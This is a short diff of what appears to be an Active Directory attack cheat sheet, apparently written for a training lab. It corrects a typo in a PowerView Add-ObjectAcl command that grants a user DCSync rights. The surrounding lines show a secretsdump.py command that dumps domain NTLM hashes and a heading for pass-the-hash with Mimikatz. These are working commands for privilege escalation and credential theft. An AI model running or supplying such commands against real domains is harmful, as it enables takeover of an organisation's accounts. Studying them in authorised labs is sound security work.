@@ -156,7 +156,7 @@ secretsdump.py -hashes <> -just-dc-ntlm <domain>/<user>@<IP-DC>
 
 ### ADD DCSync Right to USER
 ```
-Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName <..USER..> -Rights DCSync -Verbos
+Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName <..USER..> -Rights DCSync -Verbose
 ```
 
 # PTH with Mimikatz
